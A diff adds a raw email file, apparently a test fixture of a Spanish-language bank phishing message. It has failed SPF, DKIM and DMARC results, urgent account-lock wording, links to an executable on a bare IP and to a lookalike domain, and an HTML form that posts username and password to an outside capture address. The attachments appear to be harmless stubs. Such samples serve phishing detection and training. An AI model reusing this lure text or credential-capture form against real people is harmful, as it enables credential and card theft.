@@ -1,0 +1,89 @@
+Return-Path: <bounce-938271@mailer-security-alerts.ru>
+Received: from mailer-security-alerts.ru (mailer-security-alerts.ru [198.51.100.44])
+        by mx.universidad.example with ESMTPS id 92A4C12017
+        for <estudiante@universidad.example>; Tue, 09 Jun 2026 21:38:42 -0600
+Received: from compromised-host.local (unknown [203.0.113.77])
+        by mailer-security-alerts.ru with ESMTP id FAKEMAIL391
+        for <estudiante@universidad.example>; Tue, 09 Jun 2026 21:38:39 -0600
+Authentication-Results: mx.universidad.example;
+        spf=fail smtp.mailfrom=mailer-security-alerts.ru;
+        dkim=fail header.d=banco.example;
+        dmarc=fail header.from=banco.example
+From: "Banco Nacional Seguridad" <alertas@banco.example>
+Reply-To: "Centro de Validacion" <soporte@verify-login.ru>
+To: estudiante@universidad.example
+Subject: Accion requerida: cuenta bloqueada por actividad inusual
+Date: Tue, 09 Jun 2026 21:38:39 -0600
+Message-ID: <20260609213839.938271@mailer-security-alerts.ru>
+MIME-Version: 1.0
+X-Mailer: BulkMailer Pro 2.1
+X-Priority: 1
+List-Unsubscribe: <http://198.51.100.44/unsubscribe>
+Content-Type: multipart/mixed; boundary="sentinel-boundary-2026"
+
+--sentinel-boundary-2026
+Content-Type: multipart/alternative; boundary="sentinel-alt-2026"
+
+--sentinel-alt-2026
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Estimado usuario:
+
+Detectamos actividad inusual en su cuenta. Por seguridad, su acceso sera bloqueado si no confirma su identidad hoy.
+
+Ingrese de inmediato en el siguiente enlace:
+http://198.51.100.44/secure-login/validar-token.exe
+
+Tambien puede verificar desde:
+http://banco.example.security-update.verify-login.ru/session
+
+Debe confirmar usuario, contrasena, token y numero de tarjeta. Esta accion vence en 30 minutos.
+
+--sentinel-alt-2026
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!doctype html>
+<html>
+  <body>
+    <h2>Centro de seguridad bancaria</h2>
+    <p>Detectamos actividad inusual en su cuenta. Por seguridad, su acceso sera bloqueado si no confirma su identidad hoy.</p>
+    <p>
+      <a href="http://198.51.100.44/secure-login/validar-token.exe">
+        https://banco.example/seguridad
+      </a>
+    </p>
+    <p>
+      Enlace alternativo:
+      <a href="http://banco.example.security-update.verify-login.ru/session">
+        Validar cuenta
+      </a>
+    </p>
+    <form action="http://198.51.100.44/capture" method="post">
+      <input name="usuario">
+      <input name="contrasena" type="password">
+    </form>
+    <p>Debe confirmar usuario, contrasena, token y numero de tarjeta. Esta accion vence en 30 minutos.</p>
+  </body>
+</html>
+
+--sentinel-alt-2026--
+
+--sentinel-boundary-2026
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="comprobante_pendiente.exe"
+Content-Transfer-Encoding: base64
+
+TVpmYWtlLWJpbmFyeS1jb250ZW50
+
+--sentinel-boundary-2026
+Content-Type: application/zip
+Content-Disposition: attachment; filename="documentos_bloqueo.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBAoAAAAAAHBpc2gAAAAAAAAAAAAAAAAJAAAAbGVhbWUudHh0UEsFBgAAAAABAAEANwAA
+ABcAAAAAAA==
+
+--sentinel-boundary-2026--
+
